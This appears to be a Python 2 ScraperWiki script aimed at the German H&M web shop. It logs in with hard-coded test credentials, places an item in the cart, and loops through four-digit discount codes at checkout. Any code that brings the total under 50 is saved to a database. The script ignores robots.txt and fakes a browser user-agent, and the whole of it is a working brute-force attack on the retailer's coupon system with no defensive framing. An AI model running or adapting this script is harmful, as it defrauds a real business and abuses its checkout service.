import mechanize 
import lxml.html
import scraperwiki  
br = mechanize.Browser()
#br.set_all_readonly(False) # allow everything to be written to 
br.set_handle_robots(False) # no robots 
br.set_handle_refresh(False) # can sometimes hang without this 
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

# Open a webpage and inspect its contents


#scraperwiki.sqlite.execute("delete from swdata where Code>0") 
count = 5000

while True:
    bcount = 0
    url = "https://www.hm.com/de/login"
    response = br.open(url)
    
    #print "All forms:", [ form.name  for form in br.forms() ]
    
    br.select_form(name="customerLogin")
    #print br.form
    
    br["username"] = "kks2@kks.de"
    br["password"] = "123456"
    
    
    response = br.submit()
    #print response.read()
    url = "http://www.hm.com/de/bag/remove?artnr=611256&stockSize=034"
    response = br.open(url)
    url = "http://www.hm.com/de/bag/add?artnr=611256&stockSize=034"
    response = br.open(url)
    url = "https://www.hm.com/de/checkout"
    response = br.open(url)
    #print response.read()
    #print "All forms:", [ form.name  for form in br.forms() ]
    while (count < 9999):
        
        br.select_form(name="checkout-discount")
        print br.form
        temp1 = "000" + str(count)
        temp2 = temp1[-4:]
        br["value"] = temp2
        print temp2
        response = br.submit()
        temp = response.read()
        root = lxml.html.fromstring(temp)
        el2 = root.cssselect("tfoot td span")[0].text.strip()
        el = el2.replace(',', '.')
        print(repr(el[0:]))
        price = float(el[0:])
        print temp2,price
        if price < 50:
            print 'geschafft'
            scraperwiki.sqlite.save(unique_keys=["Code"], data={"Code":count, "value":price})
        url = "https://www.hm.com/de/checkout/ordersummary/discountCode/remove?discountCode=" + temp2
        response = br.open(url)
        count = count + 1
        bcount = bcount + 1
        if bcount > 9999:
            url = "http://www.hm.com/de/bag/decreaseQty?artnr=611256&stockSize=034"
            response = br.open(url)
            url = "http://www.hm.com/de/logout"
            response = br.open(url)
            break
    print "Good bye!"
print "Good end"


